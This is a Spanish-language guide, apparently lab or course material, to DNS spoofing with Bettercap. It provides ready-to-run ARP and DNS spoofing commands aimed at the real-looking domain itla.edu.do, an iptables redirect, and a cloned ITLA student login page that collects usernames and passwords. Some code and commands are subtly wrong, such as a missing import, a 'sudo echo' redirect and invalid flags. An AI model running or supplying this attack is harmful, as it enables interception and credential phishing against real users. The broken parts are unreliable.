# GUÍA DE USO: DNS Spoofing con Bettercap

## 📋 Índice
1. [Preparación del Entorno](#preparación-del-entorno)
2. [Instalación de Bettercap](#instalación-de-bettercap)
3. [Configuración del Laboratorio](#configuración-del-laboratorio)
4. [Ejecución del Ataque](#ejecución-del-ataque)
5. [Análisis y Validación](#análisis-y-validación)
6. [Galería de Imágenes](#galería-de-imágenes)

---

## Preparación del Entorno

### Topología de Red Recomendada

```
┌──────────────────────────────────────────┐
│ Red Local (LAN) 192.168.1.0/24           │
├──────────────────────────────────────────┤
│                                          │
│ ┌───────────────┐    ┌────────────────┐ │
│ │  Router/GW    │    │   Atacante     │ │
│ │  192.168.1.1  │    │ 192.168.1.100  │ │
│ └───────┬───────┘    └────────┬────────┘ │
│         │                     │          │
│    ┌────┴──────┬──────────────┴───┐     │
│    │           │                  │     │
│ ┌──┴──┐   ┌───┴──┐          ┌────┴──┐  │
│ │User1│   │User2 │          │Server │  │
│ │.50  │   │.51   │          │.10    │  │
│ └─────┘   └──────┘          └───────┘  │
│                                        │
│ DNS: 8.8.8.8 (Google)                 │
│ Target domain: itla.edu.do            │
└──────────────────────────────────────────┘
     ↑
  Internet
```

### Requisitos de Hardware

- **Máquina Atacante**: Linux (Kali, Ubuntu, Debian)
- **Máquina Víctima**: PC Windows/Linux en misma red
- **Red Local**: Conexión Ethernet en mismo segmento L2
- **Servidor Web**: Máquina del atacante o servidor aparte

### Software Base

```bash
# Actualizar sistema
sudo apt update && sudo apt upgrade -y

# Instalar dependencias
sudo apt install -y \
    bettercap \
    wireshark \
    tcpdump \
    net-tools \
    iptables \
    dnsutils \
    git
```

---

## Instalación de Bettercap

### Método 1: Desde Repositorio (Recomendado)

```bash
# Instalación rápida
sudo apt-get install bettercap

# Verificar
bettercap --version
# Expected: Bettercap v2.32.0 or later

# Verificar módulos disponibles
bettercap -h | grep -i dns
# Deberías ver: dns.spoof module
```

### Método 2: Desde Código Fuente

```bash
# Requisitos previos
sudo apt install -y golang-1.20 libpcap-dev

# Descargar
git clone https://github.com/bettercap/bettercap.git
cd bettercap

# Compilar
go build -o bettercap

# Instalar
sudo mv bettercap /usr/local/bin/
```

### Verificar Instalación

```bash
# Ejecutar en modo ayuda
bettercap --help | head -20

# Listar módulos disponibles
bettercap -eval "help" 2>/dev/null | grep -i dns
```

---

## Configuración del Laboratorio

### Paso 1: Habilitar IP Forwarding (Requisito)

```bash
# Verificar estado
cat /proc/sys/net/ipv4/ip_forward
# Expected: 1 (habilitado)

# Si está deshabilitado (0):
sudo echo 1 > /proc/sys/net/ipv4/ip_forward

# O permanentemente:
sudo sysctl -w net.ipv4.ip_forward=1

# Verificar cambio
cat /proc/sys/net/ipv4/ip_forward
# Debería mostrar: 1
```

### Paso 2: Configurar Iptables (Para proxy DNS)

```bash
# Redirigir tráfico DNS al atacante
sudo iptables -t nat -A PREROUTING \
    -p udp --dport 53 \
    -j REDIRECT --to-port 5353

# Verificar configuración
sudo iptables -t nat -L PREROUTING --line-numbers
# Deberías ver la regla

# Hacer permanente (en /etc/iptables/rules.v4)
sudo apt install iptables-persistent
sudo iptables-save | sudo tee /etc/iptables/rules.v4
```

### Paso 3: Servidor Web Malicioso (Simple)

Crear un servidor web que suplanta a ITLA:

```bash
# Crear directorio
mkdir -p ~/fake_website

# Crear HTML suplantado
cat > ~/fake_website/index.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>ITLA - Instituto Tecnológico Latinoamericano</title>
    <style>
        body { font-family: Arial; background: #003d7a; }
        .container { max-width: 500px; margin: 100px auto; padding: 20px; }
        h1 { color: white; text-align: center; }
        form { background: white; padding: 20px; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; }
        button { width: 100%; padding: 10px; background: #003d7a; color: white; }
    </style>
</head>
<body>
    <div class="container">
        <h1>ITLA Portal Estudiante</h1>
        <form method="POST" action="/login">
            <input type="text" name="user" placeholder="Usuario" required>
            <input type="password" name="pass" placeholder="Contraseña" required>
            <button type="submit">Acceder</button>
        </form>
        <p style="color: white; text-align: center; font-size: 12px;">
            Versión 1.0 | © 2024 ITLA RD
        </p>
    </div>
</body>
</html>
EOF

# Verificar creación
cat ~/fake_website/index.html
```

### Paso 4: Iniciar Servidor Web Malicioso

```bash
# Método 1: Python SimpleHTTPServer
cd ~/fake_website
sudo python3 -m http.server 80

# Método 2: Python avanzado (recomendado)
cat > ~/fake_website/server.py << 'EOF'
#!/usr/bin/env python3
import http.server
import socketserver

class MyHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        print(f"[REQUEST] {self.address_string()} -> {format % args}")

    def end_headers(self):
        # Agregar headers anti-cache
        self.send_header('Cache-Control', 'no-cache, no-store, max-age=0')
        self.send_header('Pragma', 'no-cache')
        super().end_headers()

PORT = 80
Handler = MyHTTPRequestHandler
with socketserver.TCPServer(("", PORT), Handler) as httpd:
    print(f"[+] Servidor web malicioso en puerto {PORT}")
    print(f"[+] Sirviendo desde {os.getcwd()}")
    httpd.serve_forever()
EOF

# Ejecutar
sudo python3 ~/fake_website/server.py
```

---

## Ejecución del Ataque

### Método 1: Interactivo (Paso a Paso)

```bash
# Terminal 1: Iniciar Bettercap
sudo bettercap -iface eth0

# En la consola de Bettercap interactiva:
# 1. Establecer target (víctima)
bettercap> set arp.spoof.targets 192.168.1.50
# O para múltiples víctimas:
bettercap> set arp.spoof.targets 192.168.1.50,192.168.1.51

# 2. Configurar ARP Spoofing
bettercap> arp.spoof on

# 3. Configurar DNS Spoofing
bettercap> set dns.spoof.domains itla.edu.do
bettercap> set dns.spoof.address 192.168.1.100
bettercap> dns.spoof on

# 4. Verificar módulos activos
bettercap> modules
# Deberían estar: arp.spoof [on], dns.spoof [on]

# 5. Monitorear tráfico
bettercap> net.show
# Ver hosts en la red

# 6. Keepalive
bettercap> stay [ 1 minuto, de forma interactiva ]
```

### Método 2: Mediante Archivo de Configuración

```bash
# Crear archivo de configuración
cat > ~/bettercap_dns.cap << 'EOF'
# Bettercap configuration for DNS Spoofing

# Interfaz de red
iface eth0

# Target: Rango de direcciones IP a atacar
set arp.spoof.targets 192.168.1.0/24

# Gateway (router)
set arp.spoof.gateway 192.168.1.1

# Dominios a spoofear
set dns.spoof.domains itla.edu.do

# Dirección IP a la que redirigir
set dns.spoof.address 192.168.1.100

# Ejecutar módulos
arp.spoof on
dns.spoof on

# Log
log true
EOF

# Ejecutar con archivo de configuración
sudo bettercap -iface eth0 -cap ~/bettercap_dns.cap
```

### Método 3: Mediante Línea de Comandos Completa

```bash
# Comando todo en uno (no interactivo)
sudo bettercap \
    -iface eth0 \
    -T 192.168.1.50,192.168.1.51 \
    -O 192.168.1.1 \
    -eval "
        set arp.spoof.targets 192.168.1.50,192.168.1.51
        set dns.spoof.domains itla.edu.do
        set dns.spoof.address 192.168.1.100
        arp.spoof on
        dns.spoof on
        sleep 300
    "
```

---

## Análisis y Validación

### Verificación en Máquina Víctima

#### En Windows:

```powershell
# Limpiar caché DNS
ipconfig /flushdns

# Hacer consulta DNS
nslookup itla.edu.do

Server:  UnKnown
Address: 192.168.1.100      ← ¡Respuesta suplantada!

Name:    itla.edu.do
Address: 192.168.1.100      ← ¡Correcta suplantación!

# Intentar conexión
ping itla.edu.do
PING itla.edu.do [192.168.1.100] with 32 bytes of data...
Reply from 192.168.1.100: bytes=32 time=1ms

# Abrir navegador
# Ir a: http://itla.edu.do
# Ver: Sitio suplantado loading ✓
```

#### En Linux:

```bash
# Limpiar caché DNS (si existe)
sudo resolvectl flush-caches

# Consultar DNS
dig itla.edu.do

; <<>> DiG 9.11.3-1ubuntu1.8-Ubuntu <<>> itla.edu.do
;; Answer section:
itla.edu.do.		0	IN	A	192.168.1.100  ← ¡Suplantado!

# Conectar al sitio
curl -s http://itla.edu.do | head -20
# Ver código HTML del sitio malicioso
```

### Análisis con Wireshark

```bash
# Terminal 2: Capturar tráfico
sudo wireshark -i eth0 &

# Filtros recomendados:
# dns - Ver todas las consultas DNS
# dns.qry.name == "itla.edu.do" - Ver solo ITLA
# arp - Ver spoofing ARP
# tcp.port == 80 -Conexiones HTTP
```

### Captura de PCAP Específica

```bash
# Capturar solo tráfico DNS de ITLA
sudo tcpdump -i eth0 -w itla_dns.pcap \
    'udp port 53 and (host 192.168.1.50 or host 192.168.1.51)'

# Analizar PCAP capturado
tcpdump -r itla_dns.pcap -A | grep -i itla
```

### Indicadores de Éxito del Ataque

✅ **Signos de Ataque Exitoso**:
1. Consulta DNS de `itla.edu.do` retorna `192.168.1.100` ✓
2. Máquina víctima intenta conectar a `192.168.1.100` ✓
3. Sitio web suplantado se carga en navegador ✓
4. Bettercap muestra módulos activos (ARP y DNS) ✓
5. Wireshark captura ARP spoofing y DNS replies falsos ✓

❌ **Signos de Fallo**:
1. DNS retorna IP correcta original (8.8.8.8 no suplantada)
2. Bettercap no inicia módulos
3. Máquina víctima no sigue el tráfico a 192.168.1.100
4. Sitio web legítimo se carga (no el suplantado)
5. ARP tables de víctima no actualizadas

---

## Galería de Imágenes

### 1. Configuración de Bettercap (image_bettercap_setup.png)

**Contenido esperado**:
- Terminal mostrando comando `sudo bettercap -iface eth0`
- Salida inicial mostrando:
  - Interfaz de red detectada
  - Hosts encontrados en red
  - Módulos disponibles
- Estado: `[+] bettercap started`

**Cómo capturar**:
```bash
# Antes de iniciar módulos
sudo bettercap -iface eth0
# Una vez iniciado, screenshot antes de "arp.spoof on"
scrot imagenes/image_bettercap_setup.png
```

### 2. Spoofing de DNS en Wireshark (image_dns_spoofing_wireshark.png)

**Contenido esperado**:
- Ventana de Wireshark activa
- Filtro: `dns`
- Se muestran:
  - Query: `itla.edu.do` (A) desde víctima
  - Response: `192.168.1.100` (atacante)
  - TTL, campos DNS completos visibles
  - MACs y IPs identificadas

**Cómo capturar**:
```bash
# Durante ataque activo
sudo wireshark -i eth0 &
# Aplicar filtro: dns
# Hacer ping desde víctima: nslookup itla.edu.do
# Screenshot de la respuesta falsa
```

### 3. Página de Phishing (image_phishing_page.png)

**Contenido esperado**:
- Navegador web abierto
- URL: `itla.edu.do`
- Página mostrada:
  - Identificada como página falsa (ITLA styling)
  - Formulario de login visible
  - Logo/colors de ITLA suplantados

**Cómo capturar**:
```bash
# En máquina víctima
# Abrir navegador
# Ir a: http://itla.edu.do
# Ver página cargada desde atacante
# Screenshot de página completa
```

### 4. Flujo de Red del Ataque (image_network_flow.png)

**Contenido esperado**:
Diagrama visual mostrando:
```
┌─────────────────┐
│  Víctima        │
│  192.168.1.50   │
└────────┬────────┘
         │ "¿Dónde está itla.edu.do?"
         ↓
    ┌────────────────────┐
    │   Atacante (MITM)  │
    │  192.168.1.100     │
    │  Intercepta DNS    │
    └────────┬───────────┘
             │ "Está en 192.168.1.100" (FALSO)
             ↓
         ┌─────────────┐
         │   Víctima   │
         │  Conecta a  │
         │  192.168.1. │ (SERVIDOR MALICIOSO)
         │             │
         │ Sitio phish │
         │ cargado ✗   │
         └─────────────┘
```

**Herramientas para crear diagrama**:
- draw.io (online: draw.io)
- Inkscape
- GIMP basic shapes
- LibreOffice Draw

**Exportar como PNG**:
```bash
# En draw.io o LibreOffice
File → Export as → PNG
# Guardar en: imagenes/image_network_flow.png
```

### 5. Tráfico ARP Capturado (image_arp_spoofing.png)

**Contenido esperado**:
- Wireshark con filtro: `arp`
- Se muestran frames ARP:
  - Who has 192.168.1.1? Tell 192.168.1.50
  - Reply: 192.168.1.100 is at AA:BB:CC:DD:EE:FF (ATACANTE)
  - Indicadores: Duplicate IP address detected

**Cómo capturar**:
```bash
# Durante ataque ARP spoofing
sudo wireshark -i eth0 &
# Filtro: arp
# Ejecutar: arp.spoof on en Bettercap
# Ver respuestas ARP falsas
# Screenshot del ARP table siendo envenenado
```

---

## 📸 Instrucciones de Archivo de Imágenes

```bash
# Crear directorio si no existe
mkdir -p imagenes/

# Guardar imágenes con nomenclatura
# image_XXXXX.png (donde XXXXX es 5-8 caracteres aleatorios)

# Ejemplos de naming:
scrot imagenes/image_bettercap_setup.png
scrot imagenes/image_dns_spoofing_wireshark.png
# O capturar región específica:
import -window root imagenes/image_phishing_page.png

# Comprimir si es necesario (máx 2MB)
pngquant 256 imagenes/image_*.png

# Verificar
ls -lh imagenes/
```

---

## Resolución de Problemas

| Problema | Causa | Solución |
|----------|-------|----------|
| "Permission denied" running bettercap | Falta sudo | Ejecutar: `sudo bettercap ...` |
| "Interface not found" | eth0 incorrecta | Verificar: `ip link show` |
| Bettercap no detecta hosts | Red badly configured | Verificar conectividad ping a gateway |
| DNS no es suplantado | IP forwarding deshabilitado | Ejecutar: `sudo echo 1 > /proc/sys/net/ipv4/ip_forward` |
| Víctima aún ve DNS original | ARP spoofing no funciona | Verificar: `arp -a` en víctima debe mostrar MAC atacante |
| Página web no carga | Servidor HTTP no está activo | Iniciar: `sudo python3 ~/fake_website/server.py` |

---

## Próximos Pasos

1. ✅ Ejecutar ataque múltiples veces
2. ✅ Capturar evidencia visual
3. ✅ Analizar tráfico en profundidad
4. ✅ Documentar impacto
5. ✅ Implementar defensas (DNSSEC)
6. ✅ Verificar que defensa mitiga el ataque

---

**Última actualización**: Febrero 2026
